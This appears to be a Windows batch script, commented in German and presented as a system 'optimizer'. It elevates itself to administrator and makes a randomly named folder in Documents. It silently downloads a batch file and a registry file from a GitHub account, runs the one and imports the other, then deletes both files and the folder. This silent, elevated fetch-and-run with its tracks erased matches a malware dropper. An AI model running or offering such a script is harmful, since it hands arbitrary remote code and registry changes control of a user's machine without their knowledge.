@echo off
setlocal enabledelayedexpansion

:: =============================
:: 1. Adminrechte prüfen
:: =============================
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: =============================
:: 2. Zufälligen Ordnernamen generieren (7-13 Zeichen)
:: =============================
set "length=7"
set "charset=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "randomName="

:generateRandom
set /a "randIndex=%random% %% 62"
for /f "delims=" %%a in ('echo %charset:~%randIndex%,1%') do set "randomName=!randomName!%%a"
set /a "length-=1"
if !length! gtr 0 goto generateRandom

:: =============================
:: 3. Zielpfad für zufälligen Ordner im Dokumente-Ordner
:: =============================
set "documentsPath=%USERPROFILE%\Documents"
set "appDataPath=%documentsPath%\%randomName%"

:: =============================
:: 4. Ordner erstellen, falls er nicht existiert
:: =============================
if not exist "%appDataPath%" (
    mkdir "%appDataPath%"
)

:: =============================
:: 5. Dateipfade und URLs
:: =============================
set "batUrl=https://github.com/ZENZYLEovfwe/newest/raw/main/opti.bat"
set "regUrl=https://github.com/ZENZYLEovfwe/newest/raw/main/optimizter.reg"

set "batFile=%appDataPath%\opti.bat"
set "regFile=%appDataPath%\optimizter.reg"

:: =============================
:: 6. Dateien herunterladen
powershell -Command "Invoke-WebRequest -Uri '%batUrl%' -OutFile '%batFile%'" >nul 2>&1
if not exist "%batFile%" exit /b

powershell -Command "Invoke-WebRequest -Uri '%regUrl%' -OutFile '%regFile%'" >nul 2>&1
if not exist "%regFile%" exit /b

:: =============================
:: 7. Ausführen & Registry importieren
call "%batFile%" >nul 2>&1
reg import "%regFile%" >nul 2>&1

:: =============================
:: 8. Dateien löschen (nur wenn alles fertig ist)
del /f /q "%batFile%" >nul 2>&1
del /f /q "%regFile%" >nul 2>&1

:: =============================
:: 9. Ordner löschen, wenn alle Dateien gelöscht wurden
rd /s /q "%appDataPath%" >nul 2>&1

:: =============================
:: 10. Kleines Delay vor dem Schließen
timeout /t 2 >nul
exit
